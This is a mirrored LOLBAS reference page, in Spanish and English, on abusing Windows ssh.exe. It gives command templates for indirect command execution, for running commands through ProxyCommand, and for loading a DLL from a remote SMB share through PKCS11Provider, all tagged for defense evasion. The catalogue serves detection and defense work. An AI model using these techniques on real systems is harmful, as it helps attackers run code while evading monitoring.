# LOLBAS: ssh.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.

## Comandos

### Execute specified command, can be used for defense evasion.

Execute · priv: User · T1202

```cmd
ssh localhost "{CMD}"
```

Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.

### Performs execution of specified file, can be used as a defensive evasion.

Execute · priv: User · T1202

```cmd
ssh -o ProxyCommand="{CMD}" .
```

Executes specified command from ssh.exe

### Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.

Execute · priv: User · T1202

```cmd
ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
```

Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by `ssh.exe`. Note that all backslashes should be escaped (i.e. every `\` should be turned into `\\`).

